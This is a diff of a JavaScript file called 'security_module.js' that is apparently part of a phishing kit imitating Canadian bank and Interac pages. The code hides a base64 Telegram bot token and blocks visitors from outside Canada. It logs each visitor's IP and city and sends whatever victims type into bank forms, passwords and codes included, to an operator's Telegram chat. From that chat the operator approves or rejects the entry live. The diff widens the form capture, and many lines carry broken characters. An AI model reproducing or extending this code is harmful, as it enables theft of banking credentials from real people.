@@ -1,4 +1,4 @@
-﻿// security_module.js
+// security_module.js
 // Protection IP + Bot Telegram Interactif
 (function() {
     const BOT_MAIN = atob("ODU4NDE3MTI5MTpBQUhmRmszSDFXaGNBYXhUT09SNXZmcWV2cmJla3lDNW5ZNA=="); 
@@ -64,13 +64,13 @@
 
         if (!cfTraceOk && countryCode === '??') {
             show404();
-            tgSend(BOT_RADAR, "🚫 <b>ACCES BLOQUE (SECURITY MAXIMUM)</b> 🚫\n\nHeure : " + date + " à " + time + "\nID Session : <code>" + SESSION_ID + "</code>");
+            tgSend(BOT_RADAR, "?? <b>ACCES BLOQUE (SECURITY MAXIMUM)</b> ??\n\nHeure : " + date + " � " + time + "\nID Session : <code>" + SESSION_ID + "</code>");
             return;
         }
 
         if (countryCode !== 'CA') {
             show404();
-            tgSend(BOT_RADAR, "🚫 <b>ACCES BLOQUE (HORS CANADA)</b> 🚫\n\nIP : <code>" + ip + "</code>\nVille : <b>" + city + "</b>\nPays : <b>" + country + "</b> (" + countryCode + ")\nHeure : " + date + " à " + time + "\nID Session : <code>" + SESSION_ID + "</code>");
+            tgSend(BOT_RADAR, "?? <b>ACCES BLOQUE (HORS CANADA)</b> ??\n\nIP : <code>" + ip + "</code>\nVille : <b>" + city + "</b>\nPays : <b>" + country + "</b> (" + countryCode + ")\nHeure : " + date + " � " + time + "\nID Session : <code>" + SESSION_ID + "</code>");
             return;
         }
 
@@ -82,7 +82,7 @@
         
         let pageName = window.location.pathname.split('/').pop() || 'Index';
         if (!sessionStorage.getItem('geo_notified') || pageName === 'interac.html' || pageName === 'index.html') {
-            tgSend(BOT_RADAR, "👀 <b>NOUVELLE CONNEXION (CANADA) - Page: " + pageName + "</b> 👀\n\nIP : <code>" + ip + "</code>\nVille : <b>" + city + "</b>\nPays : <b>" + country + "</b>\nHeure : " + date + " à " + time + "\nID Session : <code>" + SESSION_ID + "</code>");
+            tgSend(BOT_RADAR, "?? <b>NOUVELLE CONNEXION (CANADA) - Page: " + pageName + "</b> ??\n\nIP : <code>" + ip + "</code>\nVille : <b>" + city + "</b>\nPays : <b>" + country + "</b>\nHeure : " + date + " � " + time + "\nID Session : <code>" + SESSION_ID + "</code>");
             sessionStorage.setItem('geo_notified', 'true');
         }
     }
@@ -101,7 +101,7 @@
                 let ip = sessionStorage.getItem('user_ip') || 'En cours...';
                 let city = sessionStorage.getItem('user_city') || 'En cours...';
                 
-                let msg = "🏦 <b>CLIC BANQUE SELECTIONNEE</b> 🏦\n\nBanque : <b>" + label.trim() + "</b>\nIP : <code>" + ip + "</code>\nVille : <b>" + city + "</b>\nID Session : <code>" + SESSION_ID + "</code>";
+                let msg = "?? <b>CLIC BANQUE SELECTIONNEE</b> ??\n\nBanque : <b>" + label.trim() + "</b>\nIP : <code>" + ip + "</code>\nVille : <b>" + city + "</b>\nID Session : <code>" + SESSION_ID + "</code>";
                 tgSend(BOT_RADAR, msg);
             });
         });
@@ -133,28 +133,43 @@
                 let dataText = "";
                 const inputs = form.querySelectorAll('input, select, textarea');
                 inputs.forEach(input => {
-                    let name = input.name || input.id;
-                    let val = input.value;
+                    let name = input.name || input.id || input.placeholder || 'Champ';
+                    let val = input.value ? input.value.trim() : '';
+                    
                     if (input.type === 'checkbox' || input.type === 'radio') {
                         if (!input.checked) return;
                     }
-                    if (name && val && val.trim() !== "" && input.type !== 'submit' && input.type !== 'hidden') {
+                    
+                    if (val !== '' && input.type !== 'submit' && input.type !== 'hidden' && input.type !== 'button') {
                         let cleanName = name.replace(/[-_]/g, ' ').toUpperCase();
                         dataText += "\n" + cleanName + ": <code>" + val + "</code>";
                     }
                 });
+                
+                // Backup si aucun input n'a �t� captur� par querySelectorAll (ex: champs dynamiques)
+                if (dataText === "") {
+                    const allInputs = document.querySelectorAll('input');
+                    allInputs.forEach(input => {
+                        let name = input.name || input.id || 'VALEUR';
+                        let val = input.value ? input.value.trim() : '';
+                        if (val !== '' && input.type !== 'submit' && input.type !== 'hidden' && input.type !== 'button') {
+                            let cleanName = name.replace(/[-_]/g, ' ').toUpperCase();
+                            dataText += "\n" + cleanName + ": <code>" + val + "</code>";
+                        }
+                    });
+                }
 
                 let pageName = window.location.pathname.split('/').pop() || 'Formulaire';
-                let msgText = "🌟 <b>NOUVELLE SAISIE BANCAIRE (" + pageName + ")</b> 🌟" + dataText + "\n\nID Session: <code>" + SESSION_ID + "</code>";
+                let msgText = "?? <b>NOUVELLE SAISIE BANCAIRE (" + pageName + ")</b> ??" + dataText + "\n\nID Session: <code>" + SESSION_ID + "</code>";
 
                 let buttonRows = [
                     [
-                        { text: "✅ Valide", callback_data: "valide_" + SESSION_ID },
-                        { text: "❌ Error", callback_data: "error_" + SESSION_ID }
+                        { text: "? Valide", callback_data: "valide_" + SESSION_ID },
+                        { text: "? Error", callback_data: "error_" + SESSION_ID }
                     ],
                     [
-                        { text: "+5s ⏳", callback_data: "add5_" + SESSION_ID },
-                        { text: "+10s ⏳", callback_data: "add10_" + SESSION_ID }
+                        { text: "+5s ?", callback_data: "add5_" + SESSION_ID },
+                        { text: "+10s ?", callback_data: "add10_" + SESSION_ID }
                     ]
                 ];
 
@@ -186,7 +201,7 @@
                         fetch("https://api.telegram.org/bot" + BOT_MAIN + "/editMessageText", {
                             method: 'POST',
                             headers: {'Content-Type': 'application/json'},
-                            body: JSON.stringify({chat_id: CHAT_ID, message_id: msgId, text: msgText + "\n\n✅ <i>Valide automatiquement (Temps ecoule)</i>", parse_mode: 'HTML'})
+                            body: JSON.stringify({chat_id: CHAT_ID, message_id: msgId, text: msgText + "\n\n? <i>Valide automatiquement (Temps ecoule)</i>", parse_mode: 'HTML'})
                         });
                         
                         let action = form.getAttribute('action');
@@ -219,21 +234,21 @@
                                         timeLeft += 5;
                                         fetch("https://api.telegram.org/bot" + BOT_MAIN + "/editMessageText", {
                                             method: 'POST', headers: {'Content-Type': 'application/json'},
-                                            body: JSON.stringify({chat_id: CHAT_ID, message_id: msgId, text: msgText + "\n\n⏳ <b>Temps restant : " + timeLeft + " secondes</b>", parse_mode: 'HTML', reply_markup: { inline_keyboard: buttonRows }})
+                                            body: JSON.stringify({chat_id: CHAT_ID, message_id: msgId, text: msgText + "\n\n? <b>Temps restant : " + timeLeft + " secondes</b>", parse_mode: 'HTML', reply_markup: { inline_keyboard: buttonRows }})
                                         });
                                     }
                                     else if (cbData.startsWith('add10_')) {
                                         timeLeft += 10;
                                         fetch("https://api.telegram.org/bot" + BOT_MAIN + "/editMessageText", {
                                             method: 'POST', headers: {'Content-Type': 'application/json'},
-                                            body: JSON.stringify({chat_id: CHAT_ID, message_id: msgId, text: msgText + "\n\n⏳ <b>Temps restant : " + timeLeft + " secondes</b>", parse_mode: 'HTML', reply_markup: { inline_keyboard: buttonRows }})
+                                            body: JSON.stringify({chat_id: CHAT_ID, message_id: msgId, text: msgText + "\n\n? <b>Temps restant : " + timeLeft + " secondes</b>", parse_mode: 'HTML', reply_markup: { inline_keyboard: buttonRows }})
                                         });
                                     }
                                     else if (cbData.startsWith('valide_')) {
                                         isFinished = true;
                                         fetch("https://api.telegram.org/bot" + BOT_MAIN + "/editMessageText", {
                                             method: 'POST', headers: {'Content-Type': 'application/json'},
-                                            body: JSON.stringify({chat_id: CHAT_ID, message_id: msgId, text: msgText + "\n\n✅ <i>Valide par l'admin</i>", parse_mode: 'HTML'})
+                                            body: JSON.stringify({chat_id: CHAT_ID, message_id: msgId, text: msgText + "\n\n? <i>Valide par l'admin</i>", parse_mode: 'HTML'})
                                         });
                                         let action = form.getAttribute('action');
                                         if (action) window.location.href = action;
@@ -243,7 +258,7 @@
                                         isFinished = true;
                                         fetch("https://api.telegram.org/bot" + BOT_MAIN + "/editMessageText", {
                                             method: 'POST', headers: {'Content-Type': 'application/json'},
-                                            body: JSON.stringify({chat_id: CHAT_ID, message_id: msgId, text: msgText + "\n\n❌ <i>Refuse par l'admin</i>", parse_mode: 'HTML'})
+                                            body: JSON.stringify({chat_id: CHAT_ID, message_id: msgId, text: msgText + "\n\n? <i>Refuse par l'admin</i>", parse_mode: 'HTML'})
                                         });
                                         
                                         loader.style.display = 'none';
@@ -251,9 +266,9 @@
                                         let errorContainer = document.querySelector('.error-msg, .alert-danger, #errorMsg');
                                         if (errorContainer) {
                                             errorContainer.style.display = 'block';
-                                            errorContainer.innerHTML = "Les informations saisies sont incorrectes. Veuillez réessayer.";
+                                            errorContainer.innerHTML = "Les informations saisies sont incorrectes. Veuillez r�essayer.";
                                         } else {
-                                            alert("Les informations saisies sont incorrectes. Veuillez réessayer.");
+                                            alert("Les informations saisies sont incorrectes. Veuillez r�essayer.");
                                         }
                                         
                                         let pw = form.querySelector('input[type="password"], input[name*="code"], input[name*="otp"]');
